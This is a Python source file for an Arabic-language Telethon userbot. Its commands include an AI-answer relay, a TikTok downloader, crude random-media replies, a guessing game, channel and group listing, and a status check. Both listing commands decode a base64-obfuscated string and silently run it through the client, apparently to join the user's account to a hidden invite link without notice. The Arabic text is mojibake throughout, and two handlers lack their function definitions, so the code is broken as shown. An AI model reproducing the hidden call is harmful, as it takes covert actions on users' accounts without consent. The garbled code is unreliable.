  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ŸÖŸà ÿπŸäÿ® ŸáŸäÿ¨ ÿ™ÿ≠ÿ¨Ÿä ‚éô",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(pattern=".ÿ∞ŸÉÿßÿ°(.*)"))
async def handler(event):
    await event.edit("**‚éôÔ∏ô ÿ¨ÿßÿ±Ÿê ÿßŸÑÿ¨Ÿàÿßÿ® ÿπŸÑŸâ ÿ≥ÿ§ÿßŸÑŸÉ ÿßŸÜÿ™ÿ∏ÿ± ŸÇŸÑŸäŸÑÿßŸã ...**")
    text = event.pattern_match.group(1).strip()
    if text:
        url = f'http://innova.shawrma.store/api/v1/gpt3?text={text}'
        response = requests.get(url).text
        await event.edit(response)
    else:
        await event.edit("ŸäŸèÿ±ÿ¨Ÿâ ŸÉÿ™ÿßÿ®ÿ© ÿ±ÿ≥ÿßŸÑÿ© ŸÖÿπ ÿßŸÑÿ£ŸÖÿ± ŸÑŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ÿ•ÿ¨ÿßÿ®ÿ©.")
is_Reham = False
No_group_Joker = "@Rrtdhtf"
active_aljoker = []

@client.on(events.NewMessage(pattern=".ÿßŸÑÿ∞ŸÉÿßÿ° ÿ™ŸÅÿπŸäŸÑ"))
    global is_Reham
    if not is_Reham:
        is_Reham = True
        active_aljoker.append(event.chat_id)
        await event.edit("**‚éôÔ∏ô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ∞ŸÉÿßÿ° ÿßŸÑÿßÿµÿ∑ŸÜÿßÿπŸä ÿ≥Ÿäÿ™ŸÖ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßÿ≥ÿ¶ŸÑÿ© ÿßŸÑÿ¨ŸÖŸäÿπ ÿπŸÜÿØ ÿßŸÑÿ±ÿØ ÿπŸÑŸä.**")
    else:
        await event.edit("**‚éôÔ∏ô ÿßŸÑÿ≤ÿ± ŸÖŸèŸÅÿπŸëŸÑ ÿ®ÿßŸÑŸÅÿπŸÑ.**")

@client.on(events.NewMessage(pattern=".ÿßŸÑÿ∞ŸÉÿßÿ° ÿ™ÿπÿ∑ŸäŸÑ"))
    global is_Reham
    if is_Reham:
        is_Reham = False
        if event.chat_id in active_aljoker:
            active_aljoker.remove(event.chat_id)
        await event.edit("**‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ∞ŸÉÿßÿ° ÿßŸÑÿßÿµÿ∑ŸÜÿßÿπŸä.**")
    else:
        await event.edit("**‚éôÔ∏ô ÿßŸÑÿ≤ÿ± ŸÖŸèÿπÿ∑ŸëŸÑ ÿ®ÿßŸÑŸÅÿπŸÑ.**")

@client.on(events.NewMessage(incoming=True))
async def reply_to_hussein(event):
    if not is_Reham:
        return
    if event.is_private or event.chat_id not in active_aljoker:
        return
    message = event.message
    if message.reply_to_msg_id:
        reply_message = await event.get_reply_message()
        me = await event.client.get_me()
        if reply_message.sender_id == me.id:
            if hasattr(event.chat, "username") and event.chat.username == No_group_Joker:
                return
            text = urllib.parse.quote(message.text.strip())
            try:
                response = requests.get(f'http://innova.shawrma.store/api/v1/gpt3?text={text}')
                reply_text = response.json().get("response", "‚ùå ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ŸÅŸä ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑÿ±ÿØ.")
            except Exception as e:
                reply_text = "‚ùå ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿßŸÑÿßÿ™ÿµÿßŸÑ ÿ®ÿßŸÑÿ∞ŸÉÿßÿ° ÿßŸÑÿßÿµÿ∑ŸÜÿßÿπŸä."
            await asyncio.sleep(1)
            await event.reply(reply_text)

@client.on(events.NewMessage(pattern=".ÿ™ŸÉ"))
async def tiktok_dl(event):
    ms = event.message.message
    ms = ms.replace(".ÿ™ŸÉ", "")
    if event:
            if ("https://tiktok.com/" in ms or "https://vm.tiktok.com/" in ms):
                await event.message.delete()
                a = await l313l.send_message(event.chat_id, 'Ÿäÿ¨ÿ±Ÿä ÿßŸÑÿ®ÿ≠ÿ´ ÿπŸÜ ÿßŸÑŸÖŸÑŸÅ..')
                link = ms.strip()
                try:
                    response = requests.get(f"https://godownloader.com/api/tiktok-no-watermark-free?url={link}&key=godownloader.com")
                    data = response.json()
                    
                    video_link = data["video_no_watermark"]
                    response = requests.get(video_link)
                    video_data = response.content
                    directory = str(round(time.time()))
                    filename = str(int(time.time()))+'.mp4'
                    os.mkdir(directory)
                    video_filename = f"{directory}/{filename}"
                    with open(video_filename, "wb") as file:
                        file.write(video_data)
                
                except JSONDecodeError:
                    return await a.edit("ÿßŸÑÿ±ÿßÿ®ÿ∑ ÿ∫Ÿäÿ± ÿµÿ≠Ÿäÿ≠ ÿ™ÿ£ŸÉÿØ ŸÖŸÜŸá!")
                except Exception as er:
                    if 'video_no_watermark' in str(er):
                        return await a.edit("**ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÅŸäÿØŸäŸà ÿ∫Ÿäÿ± ÿµÿ≠Ÿäÿ≠ ÿ™ÿ£ŸÉÿØ ŸÖŸÜŸá ŸàÿßÿπÿØ ÿßŸÑŸÖÿ≠ÿßŸàŸÑÿ©**")
                    return await a.edit(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ŸÇŸÖ ÿ®ÿ™Ÿàÿ¨ŸäŸá ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸâ ŸÖÿ∑Ÿàÿ±Ÿä @Fa_rr_d\n{er}")
            
            
                
                await a.edit(f' Ÿäÿ¨ÿ±Ÿä ÿßŸÑÿ™ÿ≠ŸÖŸäŸÑ ŸÑŸÑÿÆÿßÿØŸÖ..!\n'
                   f' Ÿäÿ¨ÿ±Ÿä ÿßŸÑÿ±ŸÅÿπ ŸÑŸÑÿ™ŸÑÿ¨ÿ±ÿßŸÖ‚è≥__')
                start = time.time()
                title = "ŸÅŸäÿØŸäŸà"
                filesize_bytes = os.path.getsize(video_filename)
                filesize = filesize_bytes / (1024 * 1024)
                catid = await reply_id(event.message)
                await l313l.send_file(
                   event.chat_id, f"{directory}/{filename}", reply_to=catid,     force_document=False,     caption=f"**ÿßŸÑŸÖŸÑŸÅ : ** {filename}\n**ÿßŸÑÿ≠ÿ¨ŸÖ :**     {round(filesize, 1)} MB"
                 )
        
                await a.delete()
     
                shutil.rmtree(directory)
    #else:
       # return None
       

@client.on(events.NewMessage(outgoing=True, pattern=".ŸÑŸàŸÉŸä ÿ¥ÿØÿÆŸÑŸÉ$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/382/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿ¥ÿØÿÆŸÑŸÉ ‚éô",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ŸäÿπŸÜŸä ŸáŸÑ ÿÆÿ±Ÿá$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/381/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿÆÿ±Ÿá ‚éô",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(pattern=".ŸÇÿßÿ¶ŸÖŸá (ÿ¨ŸÖŸäÿπ ÿßŸÑŸÇŸÜŸàÿßÿ™|ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑŸÖÿ¥ÿ±ŸÅ ÿπŸÑŸäŸáÿß |ŸÇŸÜŸàÿßÿ™Ÿä)"))
async def ViewChJok(event):
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    hi = []
    hica = []
    hico = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            channel_name = entity.title
            channel_id = entity.id
            is_owner = entity.creator
            is_admin = entity.admin_rights
            if entity.username:
                if entity.megagroup:
                    channel_link = f"{channel_name} ({entity.username})"
                else:
                    channel_link = f"[{channel_name}](https://t.me/{entity.username})"
            else:
                if entity.megagroup:
                    channel_link = f"{channel_name}"
                else:
                    channel_link = f"[{channel_name}](https://t.me/c/{channel_id}/1)"
            if is_owner:
                hico.append(channel_link)
            if is_admin:
                hica.append(channel_link)
            if not is_owner and not is_admin:
                hi.append(channel_link)
    if catcmd == "ÿ¨ŸÖŸäÿπ ÿßŸÑŸÇŸÜŸàÿßÿ™":
        output = CHANNELS_STR
        for k, channel in enumerate(hi, start=1):
            output += f"{k}‚Ä¢ {channel}\n"
    elif catcmd == "ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑŸÖÿ¥ÿ±ŸÅ ÿπŸÑŸäŸáÿß":
        output = CHANNELS_ADMINSTR
        for k, channel in enumerate(hica, start=1):
            output += f"{k}‚Ä¢ {channel}\n"
    elif catcmd == "ŸÇŸÜŸàÿßÿ™Ÿä":
        output = CHANNELS_OWNERSTR
        for k, channel in enumerate(hico, start=1):
            output += f"{k}‚Ä¢ {channel}\n"
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n\n**ÿßÿ≥ÿ™ÿ∫ÿ±ŸÇ ÿ≠ÿ≥ÿßÿ® ÿßŸÑŸÇŸÜŸàÿßÿ™: **{stop_time:.02f} ÿ´ÿßŸÜŸäÿ©"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(catevent, output)

async def edit_or_reply(event, text, buttons=None):
    if buttons is None:
        buttons = []
    if event.edit_date is None:
        return await event.reply(text, buttons=buttons)
    else:
        return await event.edit(text, buttons=buttons)
        
@client.on(events.NewMessage(pattern=".ŸÇÿßÿ¶ŸÖŸá (ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™|ŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßÿØŸäÿ±Ÿáÿß|ŸÉÿ±Ÿàÿ®ÿßÿ™Ÿä)$"))
async def stats(event):  
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    hi = []
    higa = []
    higo = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            continue
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)
        ):
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                higa.append([entity.title, entity.id])
            if entity.creator:
                higo.append([entity.title, entity.id])
    if catcmd == "ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™":
        output = GROUPS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_STR
    elif catcmd == "ŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßÿØŸäÿ±Ÿáÿß":
        output = GROUPS_ADMINSTR
        for k, i in enumerate(higa, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_ADMINSTR
    elif catcmd == "ŸÉÿ±Ÿàÿ®ÿßÿ™Ÿä":
        output = GROUPS_OWNERSTR
        for k, i in enumerate(higo, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n**ÿßÿ≥ÿ™ÿ∫ÿ±ŸÇ ÿ≠ÿ≥ÿßÿ® ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ : ** {stop_time:.02f} ÿ´ÿßŸÜŸäŸá"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(
            catevent,
            output,
            caption=caption,
        )
STAT_INDICATION = "**‚éôÔ∏ô ÿ¨ŸÄÿßÿ±Ÿä ÿ¨ŸÄŸÖŸÄÿπ ÿßŸÑÿ•ÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿßŸÜÿ™ŸÄÿ∏ŸÄÿ± ‚è± **"
CHANNELS_STR = "**‚éôÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿ™Ÿä ÿ£ŸÜÿ™ ŸÅŸäŸáÿß ŸÖŸàÿ¨ŸàÿØÿ© ŸáŸÜÿß\n\n"
CHANNELS_ADMINSTR = "**‚éôÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿ™Ÿä ÿßŸÜÿ™ ŸÖÿ¥ŸÄÿ±ŸÅ ÿ®ŸáŸÄÿß **\n\n"
CHANNELS_OWNERSTR = "**‚éôÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿ™Ÿä ÿ™ŸÄŸÉŸàŸÜ ÿßŸÜÿ™ ŸÖÿßŸÑŸÉŸÄŸáÿß**\n\n"
GROUPS_STR = "**‚éôÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑÿ™Ÿä ÿ£ŸÜÿ™ ŸÅŸäŸáÿß ŸÖŸàÿ¨ŸàÿØ ŸÅŸäŸÄŸáÿß**\n\n"
GROUPS_ADMINSTR = "**‚éôÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑÿ™Ÿä ÿ™ŸÉŸàŸÜ ŸÖÿ¥ŸÄÿ±ŸÅ ÿ®ŸáŸÄÿß**\n\n"
GROUPS_OWNERSTR = "**‚éôÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑÿ™Ÿä ÿ™ŸÄŸÉŸàŸÜ ÿßŸÜÿ™ ŸÖÿßŸÑŸÉŸÄŸáÿß**\n\n"

@client.on(events.NewMessage(outgoing=True, pattern=r'\.ÿßÿ≥ÿ±ÿπ (.*)'))
async def handle_start(event):
    is_game_started = True
    is_word_sent = False
    word = event.pattern_match.group(1)
    chat_id = event.chat_id
    await event.edit(f"**ÿßŸàŸÑ ŸÖŸÜ ŸäŸÉÿ™ÿ® ( {word} ) ÿ≥ŸäŸÅŸàÿ≤**")

joker = [
    "ÿ™ŸÑÿπÿ® ŸàÿÆŸàÿ¥ ÿ™ŸÑÿπÿ® ",
    "ŸÑŸÉ ÿπÿßÿ¥ Ÿäÿßÿ®ÿ∑ŸÑ ÿßÿ≥ÿ™ŸÖÿ± ",
    "ÿπŸÑŸâ ŸÉŸäŸÅŸÉ ÿ±ŸÉÿ≤ÿ≤ÿ≤ÿ≤ ÿßŸÜÿ™Ÿé ŸÉÿØŸáÿß ",
    "ŸÑŸÉ ŸàÿπŸÑŸä ÿ∞ŸäŸäŸäÿ® ",
]

correct_answer = None
game_board = [["" for _ in range(6)] for _ in range(1)]
numbers_board = [["1Ô∏è‚É£", "2Ô∏è‚É£", "3Ô∏è‚É£", "4Ô∏è‚É£", "5Ô∏è‚É£", "6Ô∏è‚É£"]]
original_game_board = [["" for _ in range(6)] for _ in range(1)]
joker_player = None
is_game_started2 = False
group_game_status = {}
points = {}

async def handle_clue(event):
    global group_game_status, correct_answer, game_board
    chat_id = event.chat_id
    if chat_id not in group_game_status or not group_game_status[chat_id]:
        group_game_status[chat_id] = {
            'is_game_started2': False,
            'joker_player': None
        }
    if not group_game_status[chat_id]['is_game_started2']:
        group_game_status[chat_id]['is_game_started2'] = True
        group_game_status[chat_id]['joker_player'] = None
        correct_answer = random.randint(1, 6)
        await event.edit(f"**ÿßŸàŸÑ ŸÖŸÜ Ÿäÿ±ÿ≥ŸÑ ŸÉŸÑŸÖÿ© (ÿßŸÜÿß) ÿ≥Ÿäÿ¥ÿßÿ±ŸÉ ŸÅŸä ŸÑÿπÿ®ÿ© ÿßŸÑŸÖÿ≠Ÿäÿ®ÿ≥\nŸÖŸÑÿßÿ≠ÿ∏ÿ© : ŸÑŸÅÿ™ÿ≠ ÿßŸÑÿπÿ∂ŸÖÿ© ÿßÿ±ÿ≥ŸÑ ÿ∑ŸÉ Ÿàÿ±ŸÇŸÖ ÿßŸÑÿπÿ∂ŸÖÿ© ŸÑÿ£ÿÆÿ∞ ÿßŸÑŸÖÿ≠ÿ®ÿ≥ ÿ£ÿ±ÿ≥ŸÑ ÿ¨Ÿäÿ® Ÿàÿ±ŸÇŸÖ ÿßŸÑÿπÿ∂ŸÖÿ©**")

@client.on(events.NewMessage(pattern=r"^.ŸÖÿ≠Ÿäÿ®ÿ≥$"))
async def handler(event):
    global group_game_status
    chat_id = event.chat_id
    if chat_id in group_game_status:
        group_game_status[chat_id]['is_game_started2'] = False
    await handle_clue(event)
    

@client.on(events.NewMessage(pattern=r'\.ÿ∑ŸÉ (\d+)'))
async def handle_strike(event):
    global group_game_status, correct_answer, game_board
    chat_id = event.chat_id
    if chat_id in group_game_status and group_game_status[chat_id]['is_game_started2'] and event.sender_id == group_game_status[chat_id]['joker_player']:
        strike_position = int(event.pattern_match.group(1))
        if strike_position == correct_answer:
            game_board = [["üíç" if i == correct_answer - 1 else "üñêÔ∏è" for i in range(6)]]
            await event.reply(f"** ÿÆÿ≥ÿ±ÿ™ ÿ¥ÿ®ŸäŸÉ ŸÖÿ≥ÿ™ÿπÿ¨ŸÑ Ÿàÿ¨Ÿá ÿßŸÑ⁄ÜŸàÿ® üòí\n{format_board(game_board, numbers_board)}**")
            game_board = [row[:] for row in original_game_board]
            group_game_status[chat_id]['is_game_started2'] = False
            group_game_status[chat_id]['joker_player'] = None
        else:
            game_board[0][strike_position - 1] = 'üñêÔ∏è'
            Fa_rr_d = random.choice(joker)
            await event.reply(f"**{Fa_rr_d}**\n{format_board(game_board, numbers_board)}")

@client.on(events.NewMessage(pattern=r'\.ÿ¨Ÿäÿ® (\d+)'))
async def handle_guess(event):
    global group_game_status, correct_answer, game_board
    chat_id = event.chat_id
    if chat_id in group_game_status and group_game_status[chat_id]['is_game_started2'] and event.sender_id == group_game_status[chat_id]['joker_player']:
        guess = int(event.pattern_match.group(1))
        if 1 <= guess <= 6:
            if guess == correct_answer:
                winner_id = event.sender_id
                if winner_id not in points:
                    points[winner_id] = 0
                points[winner_id] += 1
                sender = await event.get_sender()
                sender_first_name = sender.first_name if sender else 'ŸÖÿ¨ŸáŸàŸÑ'
                sorted_points = sorted(points.items(), key=lambda x: x[1], reverse=True)
                points_text = '\n'.join([f'{i+1}‚Ä¢ {(await l313l.get_entity(participant_id)).first_name}: {participant_points}' for i, (participant_id, participant_points) in enumerate(sorted_points)])
                game_board = [["üíç" if i == correct_answer - 1 else "üñêÔ∏è" for i in range(6)]]
                await l313l.send_message(event.chat_id, f'ÿßŸÑŸÅ ŸÖÿ®ÿ±ŸàŸàŸàŸÉ üéâ ÿßŸÑÿßÿπÿ® ( {sender_first_name} ) Ÿàÿ¨ÿØ ÿßŸÑŸÖÿ≠ÿ®ÿ≥ üíç!\n{format_board(game_board, numbers_board)}')
                game_board = [row[:] for row in original_game_board]
                await l313l.send_message(event.chat_id, f'ŸÜŸÇÿßÿ∑ ÿßŸÑÿßÿπÿ® : {points[winner_id]}\nŸÜŸÇÿßÿ∑ ÿßŸÑŸÖÿ¥ÿßÿ±ŸÉŸäŸÜ:\n{points_text}')
            else:
                game_board = [["üíç" if i == correct_answer - 1 else "üñêÔ∏è" for i in range(6)]]
                await event.reply(f"**ÿ∂ÿßÿπ ÿßŸÑÿ®ÿßÿ™ ŸÖÿßÿ∂ŸÜ ÿ®ÿπÿØ ÿ™ŸÑ⁄ØŸàŸÜÿ© ‚òπÔ∏è\n{format_board(game_board, numbers_board)}**")
                game_board = [row[:] for row in original_game_board]
            group_game_status[chat_id]['is_game_started2'] = False
            group_game_status[chat_id]['joker_player'] = None

@client.on(events.NewMessage(pattern=r'\ÿßŸÜÿß'))
async def handle_incoming_message(event):
    global group_game_status
    chat_id = event.chat_id
    if chat_id not in group_game_status:
        group_game_status[chat_id] = {
            'is_game_started2': False,
            'joker_player': None
        }
    if group_game_status[chat_id]['is_game_started2'] and not group_game_status[chat_id]['joker_player']:
        group_game_status[chat_id]['joker_player'] = event.sender_id
        await event.reply(f"**ÿ™ŸÖ ÿ™ÿ≥ÿ¨ŸäŸÑŸÉ ŸÅŸä ÿßŸÑŸÖÿ≥ÿßÿ®ŸÇÿ© ÿ±Ÿàÿ≠ ÿ≥Ÿàÿ±ÿ≥ FLEX ÿ®ÿ∏Ÿáÿ±ŸÉ\n{format_board(game_board, numbers_board)}**")

def format_board(game_board, numbers_board):
    formatted_board = ""
    formatted_board += " ".join(numbers_board[0]) + "\n"
    formatted_board += " ".join(game_board[0]) + "\n"
    return formatted_board

@client.on(events.NewMessage(pattern=r'.ŸÖŸÜÿπ ÿßŸÑÿ™ŸÅŸÑŸäÿ¥'))
async def handle_incoming_message(event):
    addgvar("Mn3_Kick", True)
    await event.edit("**‚éôÔ∏ô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ŸÖŸÜÿπ ÿßŸÑÿ™ŸÅŸÑŸäÿ¥ ŸÑŸÑŸÖÿ¨ŸÖŸàÿπÿ© ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")

@client.on(events.NewMessage(pattern=r'.ÿ≥ŸÖÿßÿ≠_ÿßŸÑÿ™ŸÅŸÑŸäÿ¥'))
async def handle_incoming_message(event):
    delgvar("Mn3_Kick")
    await event.edit("**‚éôÔ∏ô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ŸÖŸÜÿπ ÿßŸÑÿ™ŸÅŸÑŸäÿ¥ ŸÑŸÑŸÖÿ¨ŸÖŸàÿπÿ© ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")
message_counts = {}
enabled_groups = []
Ya_Abbas = False
@client.on(events.NewMessage(pattern=r'.ÿßŸÑŸÜÿ¥ÿ± ÿ™ÿπÿ∑ŸäŸÑ'))
async def handle_incoming_message(event):
    global Ya_Abbas
    Ya_Abbas = True
    enabled_groups.append(event.chat_id)
    await event.edit("**‚éôÔ∏ô ‚úì ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÖÿ± ŸÖŸÜÿπ ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ÿ®ŸÜÿ¨ÿßÿ≠**")
@client.on(events.NewMessage(pattern=r'.ÿßŸÑŸÜÿ¥ÿ± ÿ™ŸÅÿπŸäŸÑ'))
async def handle_incoming_message(event):
    global Ya_Abbas
    Ya_Abbas = False
    enabled_groups.remove(event.chat_id)
    await event.edit("**‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÖÿ± ŸÖŸÜÿπ ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì **")

@client.on(events.NewMessage(outgoing=True, pattern=".ÿ≤Ÿäÿ¨ ÿ≠ÿ≤ŸäŸÜ"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/125/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿ≤Ÿäÿ¨ ÿ≠ÿ≤ŸäŸÜ ‚éô",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿßŸàŸäŸÑŸä$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/361/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿßŸàŸäŸÑŸä ‚éô",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".Ÿáÿßÿ±ŸàŸÜŸä$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/380/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : Ÿáÿßÿ±ŸàŸÜŸä ‚éô",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿßŸÜÿß$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/Xgoopb/4/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿßŸÜÿß ÿßŸÑÿ∞Ÿä ÿßÿ±ÿπÿ® ÿßŸÖÿ±ŸäŸÉÿß ‚éô",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿ®ÿ±ÿπ$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/Xgoopb/5/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿ™ŸÅ ŸäŸÑŸá ÿ®ÿ±ÿπ ÿ®ÿ±ÿπ ‚éô",parse_mode="html")
  await joker313.delete()

import asyncio
import datetime as dt
import platform
import time
import os
from ping3 import ping


check_message = """
‚ãÜ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ FLŒûX S·ó∞ ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚ãÜ

[‚ô¢] NAME        : {mention}
[‚öô] PYTHON      : {python_version}
[üîß] TELETHON   : {telethon_ver}
[üì°] PING       : {ping_result} ms
[‚è≤] UPTIME     : {uptime}
[üóì] SETUP DATE : {setup_date_str}

‚ãÜ‚îÄ‚îÄ‚îÄ‚ãÜ [ POWERED BY FLŒûX‚Ñ¢ ] ‚ãÜ‚îÄ‚îÄ‚îÄ‚ãÜ
"""
check_image_path = None  

@client.on(events.NewMessage(from_users='me', pattern='.ŸÅÿ≠ÿµ'))
async def send_check_message(event):
    global check_message, check_image_path
    msg = await event.edit("ÿ¨ŸÄÿßÿ±Ÿê ÿßŸÑŸÖÿπŸÄÿßŸÑÿ¨Ÿá ...")
    await asyncio.sleep(1)

    current_time = dt.datetime.now(dt.timezone(dt.timedelta(hours=3)))
    uptime = current_time.strftime('%H:%M')
    python_version = platform.python_version()
    telethon_ver = telethon_version.__version__
    setup_date = dt.datetime.now(dt.timezone(dt.timedelta(hours=3)))
    setup_date_str = setup_date.strftime('%Y-%m-%d %H:%M')

    try:
        ping_time = ping("8.8.8.8", unit="ms")
        ping_result = f"{ping_time:.2f} ms" if ping_time is not None else "ÿ™ÿπÿ∞ÿ± ÿßŸÑÿ≠ÿ≥ÿßÿ®"
    except Exception:
        ping_result = "ÿ™ÿπÿ∞ÿ± ÿßŸÑÿ≠ÿ≥ÿßÿ®"

    sender = await event.get_sender()
    user_id = sender.id
    first_name = sender.first_name if sender and sender.first_name else "ŸÖÿ≥ÿ™ÿÆÿØŸÖ"
    mention = f"[{first_name}](tg://user?id={user_id})"

    message = check_message.format(
        mention=mention,
        python_version=python_version,
        telethon_ver=telethon_ver,
        uptime=uptime,
        ping_result=ping_result,
        setup_date_str=setup_date_str,
        user_id=user_id
    )

    if check_image_path and os.path.exists(check_image_path):
        await client.send_file(event.chat_id, check_image_path, caption=message, reply_to=event.id, parse_mode="md")
        await msg.delete()
    else:
        await client.send_message(event.chat_id, message, parse_mode="md", reply_to=event.id)
        await msg.delete()


@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ÿπŸäŸäŸÜ ÿµŸàÿ±ÿ© ÿßŸÑŸÅÿ≠ÿµ'))
async def set_check_image(event):
    global check_image_path

    if not event.reply_to_msg_id:
        await event.edit("**‚éô Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿ™ÿ≠ÿ™ŸàŸä ÿπŸÑŸâ ÿßŸÑÿµŸàÿ±ÿ© ÿßŸÑÿ¨ÿØŸäÿØÿ©.**")
        return

    reply_message = await event.get_reply_message()

    if not reply_message.media:
        await event.edit("**‚éô Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿµŸàÿ±ÿ© ŸàŸÑŸäÿ≥ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ŸÜÿµŸäÿ©.**")
        return

    file_path = await reply_message.download_media()
    check_image_path = file_path

    await event.edit("**‚éô ÿ™ŸÖ ÿ™ÿπŸäŸäŸÜ ÿµŸàÿ±ÿ© ÿßŸÑŸÅÿ≠ÿµ ÿ®ŸÜÿ¨ÿßÿ≠!**")


@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ÿπŸäŸäŸÜ ŸÉŸÑŸäÿ¥ÿ© ÿßŸÑŸÅÿ≠ÿµ'))
async def update_check_message(event):
    global check_message

    allowed_vars = {
        "mention", "telethon_ver", "python_version", 
        "ping_result", "uptime", "setup_date_str", "user_id"
    }

    if not event.reply_to_msg_id:
